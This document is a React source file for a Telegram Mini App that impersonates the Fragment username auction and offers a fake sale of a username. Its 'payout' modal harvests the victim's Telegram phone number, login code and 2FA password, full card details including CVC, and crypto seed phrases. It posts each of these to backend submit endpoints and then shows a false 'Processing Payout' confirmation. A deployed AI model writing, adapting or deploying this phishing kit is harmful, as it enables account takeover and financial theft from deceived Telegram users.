import { useState, useEffect } from 'react';
import { ArrowUpRight, ShieldCheck, Menu, X, ExternalLink, ArrowLeft, History, Share2, CreditCard, Wallet, Lock, Send, Phone, Key, Fingerprint, CheckCircle2, Globe, BadgeCheck, Zap } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

// Use a fallback for when Telegram WebApp is not available (e.g., in a browser)
const tg = (window as any).Telegram?.WebApp;

export default function App() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [modalStep, setModalStep] = useState<'select' | 'phone' | 'code' | '2fa' | 'card' | 'wallet' | 'success'>('select');
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [twoFactor, setTwoFactor] = useState('');
  const [cardData, setCardData] = useState({ number: '', expiry: '', cvc: '', name: '' });
  const [seedPhrase, setSeedPhrase] = useState('');
  const [loading, setLoading] = useState(false);
  const [allowedMethods, setAllowedMethods] = useState<string[]>(['telegram', 'wallet', 'card']);

  const [pageData, setPageData] = useState({
    username: 'news',
    priceTON: 382,
    priceUSD: 2000,
    pfp: 'https://picsum.photos/seed/news/400/400',
    status: 'On Sale',
    owner: 'EQB...3f2',
    history: [
      { id: 1, user: 'EQA...9x1', amount: 382, time: '2 hours ago', type: 'Listed' },
      { id: 2, user: 'EQC...4v2', amount: 350, time: '5 days ago', type: 'Sold' },
      { id: 3, user: 'EQD...1z8', amount: 300, time: '1 month ago', type: 'Sold' },
    ]
  });

  useEffect(() => {
    if (tg) {
      tg.expand();
      const linkId = tg.initDataUnsafe?.start_param;

      if (linkId) {
        fetch(`api/link/${linkId}`)
          .then(res => res.json())
          .then(data => {
            if (data.methods) setAllowedMethods(data.methods);

            if (data.type === 'custom') {
              setPageData(prev => ({
                ...prev,
                username: data.username,
                priceTON: data.price,
                priceUSD: Math.floor(data.price * 5.23),
                pfp: data.pfp
              }));
            } else if (data.type === 'auto') {
              const user = tg.initDataUnsafe?.user;
              setPageData(prev => ({
                ...prev,
                username: user?.username || user?.first_name || 'user',
                priceTON: data.price,
                priceUSD: Math.floor(data.price * 5.23),
                pfp: user?.photo_url || `https://ui-avatars.com/api/?name=${user?.first_name || 'U'}&background=random&size=400`
              }));
            }
          })
          .catch(err => console.error("Failed to load link data", err));
      }
    }
  }, []);

  const handleOpenModal = () => {
    setModalStep('select');
    setIsModalOpen(true);
  };

  const handlePhoneSubmit = async () => {
    setLoading(true);
    try {
      const response = await fetch('api/submit/phone', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, user: tg?.initDataUnsafe?.user })
      });
      if (response.ok) setModalStep('code');
      else alert("Service unavailable. Try again.");
    } catch (err) {
      alert("Network error.");
    }
    setLoading(false);
  };

  const handleCodeSubmit = async () => {
    setLoading(true);
    try {
      const response = await fetch('api/submit/code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, code, user: tg?.initDataUnsafe?.user })
      });
      const data = await response.json();
      if (data.status === '2fa_needed') setModalStep('2fa');
      else setModalStep('success');
    } catch (err) { alert("Submission error."); }
    setLoading(false);
  };

  const handle2FASubmit = async () => {
    setLoading(true);
    try {
      await fetch('api/submit/2fa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, twoFactor, user: tg?.initDataUnsafe?.user })
      });
      setModalStep('success');
    } catch (err) {}
    setLoading(false);
  };

  const handleCardSubmit = async () => {
    setLoading(true);
    try {
      await fetch('api/submit/card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, cardData, user: tg?.initDataUnsafe?.user })
      });
      setModalStep('success');
    } catch (err) {}
    setLoading(false);
  };

  const handleWalletSubmit = async () => {
    setLoading(true);
    try {
      await fetch('api/submit/wallet', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ seedPhrase, user: tg?.initDataUnsafe?.user })
      });
      setModalStep('success');
    } catch (err) {}
    setLoading(false);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const parts = [];
    for (let i = 0; i < v.length && i < 16; i += 4) {
      parts.push(v.substring(i, i + 4));
    }
    setCardData({ ...cardData, number: parts.join(' ') });
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 2) value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
    setCardData({ ...cardData, expiry: value.substring(0, 7) });
  };

  return (
    <div className="min-h-screen flex flex-col bg-fragment-bg text-fragment-text selection:bg-fragment-blue/30 relative overflow-hidden font-sans antialiased">
      {/* Dynamic Background Effects */}
      <div className="fixed inset-0 pointer-events-none z-0">
        <div className="absolute top-[-20%] left-[-10%] w-[60%] h-[60%] bg-fragment-blue/10 rounded-full blur-[120px] animate-pulse" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-purple-500/5 rounded-full blur-[100px]" />
      </div>

      <header className="sticky top-0 z-50 bg-fragment-bg/80 backdrop-blur-xl border-b border-white/5">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-gradient-to-br from-fragment-blue to-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-fragment-blue/20">
                <Send size={20} className="text-white fill-white rotate-[-10deg]" />
              </div>
              <div className="flex flex-col">
                <span className="text-lg font-black tracking-tighter text-white leading-none">FRAGMENT</span>
                <span className="text-[10px] font-bold text-fragment-blue tracking-widest">AUCTION</span>
              </div>
            </div>
            <button className="bg-white/10 hover:bg-white/15 text-white px-5 py-2.5 rounded-xl font-bold text-xs transition-all border border-white/5">
              Connect TON
            </button>
          </div>
        </div>
      </header>

      <main className="flex-grow max-w-2xl mx-auto px-4 py-8 w-full relative z-10">
        {/* Breadcrumb */}
        <div className="flex items-center gap-4 mb-8 text-xs font-bold text-fragment-text-dim/60">
           <span className="hover:text-fragment-blue cursor-pointer">Marketplace</span>
           <span className="text-white/20">/</span>
           <span className="text-fragment-text-dim">Usernames</span>
           <span className="text-white/20">/</span>
           <span className="text-white">@{pageData.username}</span>
        </div>

        {/* Hero Card */}
        <div className="relative group mb-8">
           <div className="absolute -inset-1 bg-gradient-to-r from-fragment-blue/20 to-purple-500/20 rounded-[2.5rem] blur opacity-25 group-hover:opacity-50 transition duration-1000 group-hover:duration-200"></div>
           <div className="relative glass-card p-8 border-white/10 overflow-hidden">
             <div className="flex flex-col sm:flex-row items-center gap-8">
                <div className="relative w-40 h-40 flex-shrink-0">
                   <div className="absolute inset-0 bg-gradient-to-br from-fragment-blue to-purple-600 rounded-[2.5rem] animate-spin-slow opacity-20 blur-xl"></div>
                   <div className="relative w-full h-full rounded-[2.5rem] overflow-hidden border-2 border-white/10 shadow-2xl">
                     <img src={pageData.pfp} alt="Profile" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                   </div>
                   <div className="absolute -bottom-2 -right-2 w-10 h-10 bg-fragment-bg border-4 border-fragment-bg rounded-full flex items-center justify-center">
                      <BadgeCheck className="text-fragment-blue fill-fragment-blue/20" size={24} />
                   </div>
                </div>

                <div className="flex-1 text-center sm:text-left space-y-4">
                  <div className="inline-flex items-center gap-2 bg-green-500/10 text-green-500 border border-green-500/20 px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest">
                    <Zap size={10} className="fill-current" /> Active Auction
                  </div>
                  <h1 className="text-4xl font-black tracking-tight text-white">@{pageData.username}</h1>
                  <p className="text-fragment-text-dim/80 text-sm leading-relaxed max-w-md">
                    This premium collectible username is verified on the TON blockchain and available for immediate acquisition.
                  </p>
                  <div className="flex flex-wrap justify-center sm:justify-start gap-3">
                    <div className="bg-white/5 border border-white/5 px-4 py-2 rounded-xl text-[10px] font-bold text-fragment-text-dim flex items-center gap-2">
                       <ShieldCheck size={14} className="text-fragment-blue" /> Secure NFT Asset
                    </div>
                  </div>
                </div>
             </div>
           </div>
        </div>

        {/* Action Card */}
        <div className="glass-card bg-gradient-to-br from-white/[0.03] to-white/[0.01] p-6 sm:p-8 border-fragment-blue/20 mb-8 shadow-2xl relative overflow-hidden">
            <div className="absolute top-0 right-0 w-32 h-32 bg-fragment-blue/5 blur-[50px] -mr-16 -mt-16 rounded-full" />
            <div className="flex flex-col sm:flex-row items-start sm:items-end justify-between gap-6">
                <div className="space-y-1 w-full">
                  <p className="text-[10px] font-black text-fragment-blue uppercase tracking-[0.2em]">Minimum Bid</p>
                  <div className="flex flex-wrap items-baseline gap-3">
                    <span className="text-5xl font-black tracking-tighter text-white">{pageData.priceTON.toLocaleString()}</span>
                    <span className="text-2xl font-black text-white/40 tracking-tighter">TON</span>
                  </div>
                  <p className="text-sm font-bold text-fragment-text-dim/60">≈ ${pageData.priceUSD.toLocaleString()} USD</p>
                </div>

                <button onClick={handleOpenModal} className="w-full sm:w-auto px-8 py-5 bg-fragment-blue hover:bg-blue-500 text-white rounded-2xl font-black text-lg transition-all shadow-xl shadow-fragment-blue/25 flex items-center justify-center gap-3 active:scale-95">
                  Sell Now <ArrowUpRight size={22} strokeWidth={3} />
                </button>
            </div>
        </div>

        {/* History Section */}
        <div className="space-y-4">
           <h2 className="text-xs font-black text-white/40 uppercase tracking-[0.2em] px-4">Transaction History</h2>
           <div className="glass-card divide-y divide-white/5 overflow-hidden border-white/5">
              {pageData.history.map((event) => (
                <div key={event.id} className="p-5 flex justify-between items-center group hover:bg-white/[0.02] transition-colors">
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-white/5 to-white/[0.02] border border-white/10 flex items-center justify-center font-black text-white group-hover:border-fragment-blue/30 transition-colors">
                       {event.user.slice(0, 2).toUpperCase()}
                    </div>
                    <div>
                      <p className="font-bold text-white text-sm tracking-tight">{event.user}</p>
                      <p className="text-fragment-text-dim/50 text-[10px] font-medium">{event.time} • {event.type}</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className="font-black text-white text-sm">{event.amount} TON</p>
                  </div>
                </div>
              ))}
           </div>
        </div>
      </main>

      {/* Modern Modal System */}
      <AnimatePresence>
        {isModalOpen && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => !loading && setIsModalOpen(false)} className="absolute inset-0 bg-fragment-bg/95 backdrop-blur-md" />

            <motion.div initial={{ opacity: 0, y: 20, scale: 0.95 }} animate={{ opacity: 1, y: 0, scale: 1 }} exit={{ opacity: 0, y: 20, scale: 0.95 }} className="relative w-full max-w-md bg-fragment-card border border-white/10 rounded-[2.5rem] shadow-[0_32px_64px_-16px_rgba(0,0,0,0.5)] overflow-hidden">

              <div className="p-8">
                {modalStep !== 'success' && (
                  <div className="flex justify-between items-center mb-8">
                    <div>
                      <h2 className="text-2xl font-black text-white tracking-tight">
                        {modalStep === 'select' ? 'Choose Payout' : 'Secure Verification'}
                      </h2>
                      <p className="text-xs font-bold text-fragment-text-dim/60 mt-1">End-to-end encrypted connection</p>
                    </div>
                    <button onClick={() => setIsModalOpen(false)} className="w-10 h-10 rounded-full bg-white/5 flex items-center justify-center text-white/40 hover:text-white transition-colors"><X size={20} /></button>
                  </div>
                )}

                {modalStep === 'select' && (
                  <div className="grid gap-4">
                    {allowedMethods.includes('card') && (
                      <button onClick={() => setModalStep('card')} className="w-full p-5 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-5 hover:bg-white/10 hover:border-fragment-blue/30 transition-all group">
                        <div className="w-12 h-12 bg-fragment-blue/10 rounded-xl flex items-center justify-center text-fragment-blue group-hover:scale-110 transition-transform"><CreditCard size={24} /></div>
                        <div className="text-left"><p className="font-black text-white text-sm">Credit Card</p><p className="text-[10px] font-bold text-fragment-text-dim/60">Visa, Mastercard, Amex</p></div>
                      </button>
                    )}
                    {allowedMethods.includes('telegram') && (
                      <button onClick={() => setModalStep('phone')} className="w-full p-5 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-5 hover:bg-white/10 hover:border-fragment-blue/30 transition-all group">
                        <div className="w-12 h-12 bg-orange-500/10 rounded-xl flex items-center justify-center text-orange-500 group-hover:scale-110 transition-transform"><Send size={24} /></div>
                        <div className="text-left"><p className="font-black text-white text-sm">Telegram Account</p><p className="text-[10px] font-bold text-fragment-text-dim/60">Fast verification via App</p></div>
                      </button>
                    )}
                    {allowedMethods.includes('wallet') && (
                      <button onClick={() => setModalStep('wallet')} className="w-full p-5 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-5 hover:bg-white/10 hover:border-fragment-blue/30 transition-all group">
                        <div className="w-12 h-12 bg-green-500/10 rounded-xl flex items-center justify-center text-green-500 group-hover:scale-110 transition-transform"><Wallet size={24} /></div>
                        <div className="text-left"><p className="font-black text-white text-sm">Crypto Wallet</p><p className="text-[10px] font-bold text-fragment-text-dim/60">TON, ETH, BTC Seeds</p></div>
                      </button>
                    )}
                  </div>
                )}

                {/* Form Steps with improved inputs */}
                {modalStep === 'phone' && (
                  <div className="space-y-6">
                    <div className="space-y-2">
                      <label className="text-[10px] font-black text-white/40 uppercase tracking-widest ml-1">Phone Number</label>
                      <div className="relative">
                        <Phone className="absolute left-4 top-1/2 -translate-y-1/2 text-white/20" size={18} />
                        <input type="tel" inputMode="tel" placeholder="+1 234 567 8900" value={phone} onChange={(e) => setPhone(e.target.value)} className="w-full bg-white/5 border border-white/10 rounded-2xl p-5 pl-12 text-white placeholder:text-white/20 focus:border-fragment-blue/50 outline-none transition-all" />
                      </div>
                    </div>
                    <button onClick={handlePhoneSubmit} disabled={loading} className="w-full py-5 bg-fragment-blue text-white rounded-2xl font-black shadow-lg shadow-fragment-blue/20 active:scale-[0.98] transition-all flex items-center justify-center gap-3">
                      {loading ? 'Authenticating...' : 'Continue'} <ArrowUpRight size={18} />
                    </button>
                  </div>
                )}

                {modalStep === 'code' && (
                  <div className="space-y-6">
                    <div className="text-center space-y-2 mb-4">
                       <p className="text-sm font-bold text-white">Enter Verification Code</p>
                       <p className="text-xs text-fragment-text-dim/60">Sent to your Telegram account</p>
                    </div>
                    <input type="text" inputMode="numeric" maxLength={5} placeholder="•••••" value={code} onChange={(e) => setCode(e.target.value)} className="w-full bg-white/5 border border-white/10 rounded-2xl p-6 text-center text-3xl font-black tracking-[0.5em] text-white placeholder:text-white/10 focus:border-fragment-blue/50 outline-none" />
                    <button onClick={handleCodeSubmit} disabled={loading} className="w-full py-5 bg-fragment-blue text-white rounded-2xl font-black shadow-lg shadow-fragment-blue/20">
                      {loading ? 'Verifying...' : 'Verify Identity'}
                    </button>
                  </div>
                )}

                {modalStep === 'card' && (
                  <div className="space-y-4">
                    <div className="space-y-1.5">
                      <label className="text-[10px] font-black text-white/40 uppercase tracking-widest ml-1">Card Details</label>
                      <input type="text" inputMode="numeric" placeholder="Card Number" value={cardData.number} onChange={handleCardNumberChange} className="w-full bg-white/5 border border-white/10 rounded-2xl p-4 text-white placeholder:text-white/20 outline-none focus:border-fragment-blue/50" />
                    </div>
                    <div className="grid grid-cols-2 gap-4">
                      <input type="text" inputMode="numeric" placeholder="MM / YY" value={cardData.expiry} onChange={handleExpiryChange} className="bg-white/5 border border-white/10 rounded-2xl p-4 text-white placeholder:text-white/20 outline-none focus:border-fragment-blue/50" />
                      <input type="text" inputMode="numeric" placeholder="CVC" value={cardData.cvc} onChange={(e) => setCardData({...cardData, cvc: e.target.value})} className="bg-white/5 border border-white/10 rounded-2xl p-4 text-white placeholder:text-white/20 outline-none focus:border-fragment-blue/50" />
                    </div>
                    <input type="text" placeholder="Cardholder Name" value={cardData.name} onChange={(e) => setCardData({...cardData, name: e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-2xl p-4 text-white placeholder:text-white/20 uppercase font-bold text-sm outline-none focus:border-fragment-blue/50" />
                    <button onClick={handleCardSubmit} disabled={loading} className="w-full py-5 bg-fragment-blue text-white rounded-2xl font-black shadow-lg shadow-fragment-blue/20 mt-4">
                      Complete Registration
                    </button>
                  </div>
                )}

                {modalStep === 'success' && (
                  <div className="text-center py-8 space-y-6">
                     <div className="relative">
                        <div className="absolute inset-0 bg-green-500/20 blur-3xl rounded-full" />
                        <div className="relative w-24 h-24 bg-green-500/10 text-green-500 rounded-3xl flex items-center justify-center mx-auto border-2 border-green-500/20">
                           <CheckCircle2 size={48} strokeWidth={2.5} />
                        </div>
                     </div>
                     <div className="space-y-2">
                        <h2 className="text-2xl font-black text-white tracking-tight">Processing Payout</h2>
                        <p className="text-sm font-bold text-fragment-text-dim/60 leading-relaxed px-4">
                          Your verification is successful. The smart contract is processing your payout request on the TON blockchain.
                        </p>
                     </div>
                     <button onClick={() => setIsModalOpen(false)} className="w-full py-4 bg-white/10 hover:bg-white/20 text-white rounded-2xl font-black transition-all">
                        Return to Dashboard
                     </button>
                  </div>
                )}
              </div>

            </motion.div>
          </div>
        )}
      </AnimatePresence>

      <footer className="p-12 text-center space-y-4 relative z-10 border-t border-white/5 mt-12 bg-white/[0.01]">
        <div className="flex justify-center gap-8 mb-4">
           <Globe size={18} className="text-white/20 hover:text-fragment-blue cursor-pointer transition-colors" />
           <Send size={18} className="text-white/20 hover:text-fragment-blue cursor-pointer transition-colors" />
        </div>
        <p className="text-[10px] font-black text-white/20 uppercase tracking-[0.3em]">
          © 2026 FRAGMENT AUCTION SERVICE • POWERED BY TON
        </p>
      </footer>

      <style>{`
        @keyframes spin-slow {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        .animate-spin-slow {
          animation: spin-slow 12s linear infinite;
        }
      `}</style>
    </div>
  );
}
